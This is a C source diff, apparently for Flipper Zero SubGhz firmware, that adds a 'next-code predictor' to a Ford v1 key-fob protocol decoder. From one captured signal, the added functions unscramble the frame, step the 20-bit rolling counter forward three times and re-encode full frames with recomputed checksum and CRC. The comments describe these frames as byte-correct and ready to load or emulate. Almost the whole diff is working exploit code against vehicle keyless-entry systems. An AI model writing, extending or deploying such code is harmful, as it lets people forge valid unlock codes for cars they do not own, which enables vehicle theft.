@@ -841,6 +841,45 @@ SubGhzProtocolStatus
     return ret;
 }
 
+#define FORD_V1_PREDICT_COUNT 3
+
+/* Build the full 17-byte air frame that would be transmitted for (serial,btn,cnt),
+ * reusing the same reversible scramble + additive checksum + CRC16 the encoder uses.
+ * plain9_template/raw17_template come from a decoded capture (round-trip verified);
+ * only the button/counter/checksum change, then the block is re-scrambled and the
+ * CRC over raw[3..14] recomputed, so the output is byte-correct and load/emulate-able.
+ * Field packing mirrors ford_v1_plain_apply_fields (trivial bit-packing, not crypto);
+ * inlined here so the predictor stays available unconditionally like subaru. */
+static void ford_v1_predict_frame(
+    const uint8_t plain9_template[9],
+    const uint8_t raw17_template[FORD_V1_DATA_BYTES],
+    uint32_t serial,
+    uint8_t btn,
+    uint32_t cnt,
+    uint8_t raw17_out[FORD_V1_DATA_BYTES]) {
+    uint8_t plain9[9];
+    memcpy(plain9, plain9_template, 9);
+
+    /* Additive-checksum base preserved from the template plain block. */
+    uint8_t chk = (uint8_t)(plain9[8] - plain9[6] - plain9[7] - plain9[5]);
+    plain9[0] = (uint8_t)(serial & 0xFFU);
+    plain9[1] = (uint8_t)((serial >> 24) & 0xFFU);
+    plain9[2] = (uint8_t)((serial >> 16) & 0xFFU);
+    plain9[3] = (uint8_t)((serial >> 8) & 0xFFU);
+    plain9[5] = (uint8_t)(((btn & 0x0FU) << 4) | ((cnt >> 16) & 0x0FU));
+    plain9[6] = (uint8_t)((cnt >> 8) & 0xFFU);
+    plain9[7] = (uint8_t)(cnt & 0xFFU);
+    plain9[8] = (uint8_t)(chk + plain9[7] + plain9[6] + plain9[5]);
+
+    memcpy(raw17_out, raw17_template, FORD_V1_DATA_BYTES);
+    uint8_t air9[9];
+    ford_v1_encode_air_9bytes(plain9, air9);
+    memcpy(&raw17_out[6], air9, 9);
+    uint16_t c = ford_v1_crc16(&raw17_out[3], 12);
+    raw17_out[15] = (uint8_t)(c >> 8);
+    raw17_out[16] = (uint8_t)(c & 0xFFU);
+}
+
 void subghz_protocol_decoder_ford_v1_get_string(void* context, FuriString* output) {
     furi_check(context);
     SubGhzProtocolDecoderFordV1* instance = context;
@@ -883,6 +922,29 @@ void subghz_protocol_decoder_ford_v1_get_string(void* context, FuriString* outpu
             (unsigned long)instance->generic.cnt,
             (unsigned long)crc16,
             crc_ok ? "OK" : "ERR");
+
+        /* Next-code predictor: cleartext 20-bit counter recovered via a reversible
+         * scramble; re-encode cnt+1..N into full byte-correct frames. Guarded on a
+         * decoded frame (encryption_supported==1) with a recoverable plain block. */
+        uint8_t plain9_tmpl[9];
+        uint8_t raw_canon[FORD_V1_DATA_BYTES];
+        if(ford_v1_extract_plain_from_raw(raw, plain9_tmpl, raw_canon)) {
+            for(uint32_t i = 1; i <= FORD_V1_PREDICT_COUNT; i++) {
+                uint32_t next_cnt = (uint32_t)((instance->generic.cnt + i) & 0xFFFFFU);
+                uint8_t frame[FORD_V1_DATA_BYTES];
+                ford_v1_predict_frame(
+                    plain9_tmpl,
+                    raw_canon,
+                    instance->generic.serial,
+                    instance->generic.btn,
+                    next_cnt,
+                    frame);
+                furi_string_cat_printf(output, "\r\nNext+%lu:", (unsigned long)i);
+                for(size_t b = 0; b < FORD_V1_DATA_BYTES; b++) {
+                    furi_string_cat_printf(output, "%02X", frame[b]);
+                }
+            }
+        }
     } else {
         uint8_t raw[FORD_V1_DATA_BYTES];
         ford_v1_raw14_from_internal_keys(key1, key2, raw);
